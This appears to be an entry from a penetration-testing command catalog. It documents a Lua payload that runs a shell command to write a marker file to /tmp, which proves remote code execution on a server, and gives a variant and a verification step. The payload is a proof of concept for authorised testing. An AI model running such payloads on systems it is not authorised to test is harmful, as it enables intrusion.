---
id: cmd-execute-echo-file
data: execute('echo vakzz > /tmp/ggg')
tags:
  - rce
  - file-write
  - lua
type: command
output: 'No output, but creates the file /tmp/ggg containing ''vakzz'''
executor: lua
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:50.116Z'
verified: false
validated: true
submitted: true
---
# execute-echo-file

## Command

```lua
execute('echo vakzz > /tmp/ggg')
```

## Description

Executes a shell command via Lua's io.popen to write 'vakzz' to /tmp/ggg, proving arbitrary file creation capability in RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'echo vakzz > /tmp/ggg'` | Shell command for file write | Yes |

## Examples

### Basic Usage

```lua
execute('echo vakzz > /tmp/ggg')
```

### Advanced Usage

```lua
execute('echo "test" > /tmp/testfile')
```

## Expected Output

Silent success; verify with server-side `cat /tmp/ggg` showing 'vakzz'.

## Related

- [[commands/execute-id]]
- [[procedures/Verify-RCE-Impact-on-Server]]
